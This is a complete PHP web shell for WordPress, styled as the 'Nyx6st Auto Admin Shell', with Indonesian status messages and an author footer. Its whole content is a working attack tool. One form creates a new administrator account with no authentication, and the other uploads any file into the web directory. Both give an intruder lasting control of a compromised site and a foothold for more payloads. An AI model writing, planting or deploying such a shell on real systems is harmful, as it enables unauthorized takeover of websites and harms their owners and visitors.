<?php
// === Nyx6st - 6ickZone===
if (isset($_POST['submit_admin'])) {
    require_once('wp-load.php');

    $new_user = $_POST['new_user'];
    $new_pass = $_POST['new_pass'];
    $new_email = $_POST['new_email'];

    if (username_exists($new_user) == null && email_exists($new_email) == false) {
        $user_id = wp_create_user($new_user, $new_pass, $new_email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        echo "<script>alert('✅ Admin berhasil dibuat: $new_user');</script>";
    } else {
        echo "<script>alert('⚠️ Username/email sudah ada');</script>";
    }
}

// === HANDLE FILE UPLOAD ===
if (isset($_FILES['file'])) {
    $upload_dir = getcwd() . '/';
    $target_file = $upload_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "<script>alert('📁 Upload sukses!');</script>";
    } else {
        echo "<script>alert('❌ Upload gagal!');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nyx6st Auto Admin Shell</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #eee;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        h1 {
            color: #0ff;
            text-shadow: 0 0 5px #0ff;
        }
        input, button {
            background: #111;
            border: 1px solid #0ff;
            color: #0ff;
            padding: 6px 10px;
            margin: 5px 0;
        }
        .form-block {
            margin-bottom: 30px;
        }
        .footer {
            margin-top: 40px;
            padding-top: 10px;
            border-top: 1px solid #333;
            font-size: 14px;
            color: #aaa;
        }
        .footer a {
            color: #0ff;
            text-decoration: none;
            margin-right: 10px;
        }
        .footer span {
            margin-left: 10px;
        }
    </style>
</head><center>
<body>
    <h1>Nyx6st Auto Admin Wordpress</h1>

    <div class="form-block">
        <h3>👑 Create Admin User</h3>
        <form method="POST">
            <input type="text" name="new_user" placeholder="Username admin" required><br>
            <input type="text" name="new_pass" placeholder="Password admin" required><br>
            <input type="email" name="new_email" placeholder="Email admin" required><br>
            <input type="submit" name="submit_admin" value="Create Admin">
        </form>
    </div>

    <div class="form-block">
        <h3>📁 Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload File">
        </form>
    </div>

    <div class="footer">
        <a href="0x6ick.zone.id" target="_blank">Blog</a>
        <span>6ickwhispers@gmail.com</span>
        <a href="https://linktr.ee/6ickzone" target="_blank">MyLink</a>
    </div>
</body>
</html>
